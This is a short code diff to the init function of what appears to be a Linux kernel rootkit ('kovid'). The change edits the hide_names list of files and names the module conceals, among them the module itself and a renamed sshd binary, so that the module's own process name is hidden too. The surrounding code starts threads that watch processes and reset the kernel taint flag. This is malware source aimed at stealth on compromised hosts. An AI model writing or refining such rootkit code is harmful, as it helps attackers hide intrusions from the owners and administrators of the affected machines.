@@ -760,7 +760,7 @@ static int __init kv_init(void) {
      */
     static const char *hide_names[] = {
         ".kovid", "kovid", "kovid.ko", UUIDGEN ".ko",
-        UUIDGEN ".sh", ".sshd_orig", NULL
+        UUIDGEN ".sh", ".sshd_orig", PROCNAME, NULL
     };
 
 
@@ -793,8 +793,6 @@ static int __init kv_init(void) {
     tsk_prc = kthread_run(_proc_watchdog, NULL, THREAD_PROC_NAME);
     if (!tsk_prc)
         goto unroll_init;
-
-    fs_add_name_ro(PROCNAME, 0);
 
     tsk_tainted = kthread_run(_reset_tainted, NULL, THREAD_TAINTED_NAME);
     if (!tsk_tainted)
